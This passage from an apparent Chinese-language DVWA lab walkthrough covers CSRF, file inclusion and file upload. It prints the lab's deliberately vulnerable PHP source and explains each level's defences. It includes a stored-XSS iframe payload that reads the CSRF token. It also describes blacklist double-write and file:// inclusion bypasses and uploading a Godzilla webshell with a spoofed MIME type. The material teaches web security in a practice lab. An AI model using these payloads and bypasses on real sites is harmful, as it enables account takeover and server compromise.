<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token 加入了token检验机制</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Do the passwords match?</span><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &#123;<br>        <span class="hljs-comment">// They do!</span><br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update the database</span><br>        <span class="hljs-variable">$insert</span> = <span class="hljs-string">&quot;UPDATE `users` SET password = &#x27;<span class="hljs-subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="hljs-string">&quot;&#x27;;&quot;</span>;<br>        <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$insert</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>high级别的代码增加了token检验机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器提交token参数时服务器会在收到token时先检查token，token正确才会处理客户端请求。<br>漏洞复现：<br>这里可以利用存储型xss可执行代码获取token，其实是利用xss获取cooki中的token值，所以在这个地方我们使用xss执行。<br>现在存储型xss中写入语句<code>&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)&gt;</code>有长度限制我们F12改限制<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-11-26-56.png" alt="存储型xss获取token" class="lazyload"><br>这里不要点击确定先复制，然后打开另一个网页打开csrf题输入修改的密码点击提交抓包，不放包发送到repeater中修改token的值点击go跟随查看响应可以看到密码修改了<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-12-06-33.png" alt="操作" class="lazyload"><br>这种加token的方式由于是后台先把token发送到前端我们可以先获取到向应包中的token替换请求包中的token就能很容易绕过<br><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Change&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">//这里需要输入旧的密码进行校验</span><br>    <span class="hljs-variable">$pass_curr</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_current&#x27;</span> ];<br>    <span class="hljs-variable">$pass_new</span>  = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_new&#x27;</span> ];<br>    <span class="hljs-variable">$pass_conf</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password_conf&#x27;</span> ];<br><br>    <span class="hljs-comment">// Sanitise current password input</span><br>    <span class="hljs-variable">$pass_curr</span> = stripslashes( <span class="hljs-variable">$pass_curr</span> );<br>    <span class="hljs-variable">$pass_curr</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_curr</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$pass_curr</span> = md5( <span class="hljs-variable">$pass_curr</span> );<br><br>    <span class="hljs-comment">// Check that the current password is correct</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_curr</span>, PDO::PARAM_STR );<br>    <span class="hljs-variable">$data</span>-&gt;execute();<br><br>    <span class="hljs-comment">// Do both new passwords match and does the current password match the user?</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$pass_new</span> == <span class="hljs-variable">$pass_conf</span> ) &amp;&amp; ( <span class="hljs-variable">$data</span>-&gt;rowCount() == <span class="hljs-number">1</span> ) ) &#123;<br>        <span class="hljs-comment">// It does!</span><br>        <span class="hljs-variable">$pass_new</span> = stripslashes( <span class="hljs-variable">$pass_new</span> );<br>        <span class="hljs-variable">$pass_new</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass_new</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>        <span class="hljs-variable">$pass_new</span> = md5( <span class="hljs-variable">$pass_new</span> );<br><br>        <span class="hljs-comment">// Update database with new password</span><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;prepare( <span class="hljs-string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:password&#x27;</span>, <span class="hljs-variable">$pass_new</span>, PDO::PARAM_STR );<br>        <span class="hljs-variable">$data</span>-&gt;bindParam( <span class="hljs-string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );<br>        <span class="hljs-variable">$data</span>-&gt;execute();<br><br>        <span class="hljs-comment">// Feedback for the user</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Issue with passwords matching</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>要求我们先输入就密码再修改，攻击者不知道原始密码的情况下是无法发起攻击的。<br><strong>防护措施</strong><br>加入Anti-CSRF，每次向客户端发送一个随机数，当客户端向服务器发送数据时对比随机数从而确定身份<br>获取当前用户密码，以此判断是否为当前用户操作<br>二次确认（提示、二次密码、验证码）.</p>
<h2 id="DVWA-–-file-inclusion（文件包含）"><a href="#DVWA-–-file-inclusion（文件包含）" class="headerlink" title="DVWA – file inclusion（文件包含）"></a>DVWA – file inclusion（文件包含）</h2><p>文件包含漏洞(File Inclusion)是指当服务器开启了allow_url_include选项时，通过一些php特性函数如include()、require(),include_once(),require_once()函数利用url去动态包含文件，此时如果没有对文件来源进行严格的审查就会导致任意文件读取或者任意命令执行。<br>文件包含分类：</p>
<ul>
<li>本地文件包含：当被包含的文件再本地服务器时叫做本地文件包含，如：../../../ect/password</li>
<li>远程文件包含：当被包含的文件在第三方服务器时，就叫做远程文件包含，如：<a target="_blank" rel="noopener" href="http://www.xx.com/1.php">http://www.xx.com/1.php</a></li>
</ul>
<p>特性函数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>()   当使用该函数包含文件时，只有代码执行到<span class="hljs-keyword">include</span>()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行<br><span class="hljs-keyword">include_once</span>()   功能和<span class="hljs-keyword">include</span>()相同，区别在于当重复调用同一文件时，程序只调用一次<br><span class="hljs-keyword">require</span>()   <span class="hljs-keyword">require</span>()与<span class="hljs-keyword">include</span>()的区别在于<span class="hljs-keyword">require</span>()执行如果发生错误，函数会输出错误信息，并终止脚本的运行 。使用<span class="hljs-keyword">require</span>()函数包含文件时，只要程序一执行，立即调用文件，而<span class="hljs-keyword">include</span>()只有程序执行到函数时才调用 <br><span class="hljs-keyword">require</span>()在php程序执行前执行，会先读入 <span class="hljs-keyword">require</span> 所指定引入的文件，使它变成 PHP 程序网页的一部份。<br><span class="hljs-keyword">require_once</span>()   它的功能与<span class="hljs-keyword">require</span>()相同，区别在于当重复调用同一文件时，程序只调用一次<br></code></pre></td></tr></table></figure>

<p>File Inclusion主题：<br>首先需要设置打开文件包含<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-49-15.png" alt="打开文件包含" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-50-00.png" alt="靶场" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display 直接获取page参数，未作任何修改</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-16-57-05.png" alt="漏洞复现" class="lazyload"></p>
<p><strong>meidum</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation将参数中的http://和https:// ../ ..\都替换成了空</span><br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;http://&quot;</span>, <span class="hljs-string">&quot;https://&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-variable">$file</span> = str_replace( <span class="hljs-keyword">array</span>( <span class="hljs-string">&quot;../&quot;</span>, <span class="hljs-string">&quot;..\&quot;&quot;</span> ), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file</span> );<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里可以看到添加了黑名单将“http://” “https://” “../” “..\”全部替换成了空这个地方可以考虑双写绕过。<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-07-51.png" alt="绕过尝试" class="lazyload"></p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Input validation 这里限定匹配文件名以file开头或只能为include.php</span><br><span class="hljs-keyword">if</span>( !fnmatch( <span class="hljs-string">&quot;file*&quot;</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>匹配“file*”，以file开头的文件可以访问，或者include.php可以访问，如果不满足以上两种就输出错误语句</p>
<p>漏洞复现：<br>使用伪协议:”file:///访问本地文件系统” <a target="_blank" rel="noopener" href="https://blog.csdn.net/Wu000999/article/details/101925271">参考文章</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-21-03.png" alt="成功包含" class="lazyload"><br>这里限制了白名单只允许某些文件被包含</p>
<p><strong>impossible</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-comment">// Only allow include.php or file&#123;1..3&#125;.php</span><br><span class="hljs-comment">//file变量只能为include.php、file1、file2、file3其中一个</span><br><span class="hljs-keyword">if</span>( <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;include.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file1.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file2.php&quot;</span> &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">&quot;file3.php&quot;</span> ) &#123;<br>    <span class="hljs-comment">// This isn&#x27;t the page we want!</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ERROR: File not found!&quot;</span>;<br>    <span class="hljs-keyword">exit</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>这里使用了白名单机制进行防护，简单粗暴，page的参数已经固定了完全杜绝了文件包含</p>
<h2 id="DVWA-–-File-upload-文件上传"><a href="#DVWA-–-File-upload-文件上传" class="headerlink" title="DVWA – File upload(文件上传)"></a>DVWA – File upload(文件上传)</h2><p>这个漏洞由于对上传文件的内、类型没有做严格的过滤、检查，使得攻击者可以通过上传木马文件获取服务器的webshell文件。</p>
<p>需要配置文件上传：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-18-08-12.png" alt="打开这两个选项" class="lazyload"></p>
<p>File upload主题：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-17-30-50.png" alt="文件上传" class="lazyload"></p>
<p><strong>Low</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-comment">//文件的目标路径即文件上传路径</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Can we move the file to the upload folder?移动用户上传文件到目标路径</span><br>    <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>        <span class="hljs-comment">// No</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Yes!</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>从源码可以看到对上传文件类型、内容没有做任何的过滤和检查，同时告诉了我们文件上传路径，存在明显的文件上传漏洞<br>漏洞复现：<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-18-19-08-25.png" alt="文件上传复现" class="lazyload"><br>在上传的过程中我们使用了webshell管理工具godzilla来生成一句话和连接获取shell</p>
<p><strong>medium</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?</span><br>    <span class="hljs-comment">//文件类型必须是image/png或image/jpeg 大小不能超过98Kb</span><br>    <span class="hljs-keyword">if</span>( ( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/jpeg&quot;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&quot;image/png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ], <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>可以分析出对文件上传的类型做了限制，要求必须是image/jpeg或者image/png类型，而且对文件上传大小做了限制。<br>漏洞复现：<br>复现中级文件上传漏洞首先需要删除上传的php一句话<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-46-57.png" alt="删除刚刚上传的" class="lazyload"><br>还是上传刚才生成的一句话木马<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-49-37.png" alt="上传" class="lazyload"><br>提示只能上传的文件类型，这里抓包绕过<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/15/DVWA%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3/2023-03-19-10-54-27.png" alt="抓包绕过" class="lazyload"><br>然后用哥斯拉连接就好了</p>
<p><strong>high</strong><br>源码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Upload&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Where are we going to be writing to?</span><br>    <span class="hljs-variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&quot;hackable/uploads/&quot;</span>;<br>    <span class="hljs-variable">$target_path</span> .= basename( <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// File information</span><br>    <span class="hljs-variable">$uploaded_name</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;name&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_ext</span>  = substr( <span class="hljs-variable">$uploaded_name</span>, strrpos( <span class="hljs-variable">$uploaded_name</span>, <span class="hljs-string">&#x27;.&#x27;</span> ) + <span class="hljs-number">1</span>);<br>    <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];<br>    <span class="hljs-variable">$uploaded_tmp</span>  = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;uploaded&#x27;</span> ][ <span class="hljs-string">&#x27;tmp_name&#x27;</span> ];<br><br>    <span class="hljs-comment">// Is it an image?strtolower函数把字符转换成小写getimagesize函数会读取文件头信息如果没有则报错，high级别的代码读取文件名最后一个点后的字符串期望通过文件名来限制文件类型</span><br>    <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;jpeg&quot;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&quot;png&quot;</span> ) &amp;&amp;<br>        ( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp;<br>        getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) ) &#123;<br><br>        <span class="hljs-comment">// Can we move the file to the upload folder?</span><br>        <span class="hljs-keyword">if</span>( !move_uploaded_file( <span class="hljs-variable">$uploaded_tmp</span>, <span class="hljs-variable">$target_path</span> ) ) &#123;<br>            <span class="hljs-comment">// No</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">// Yes!</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Invalid file</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

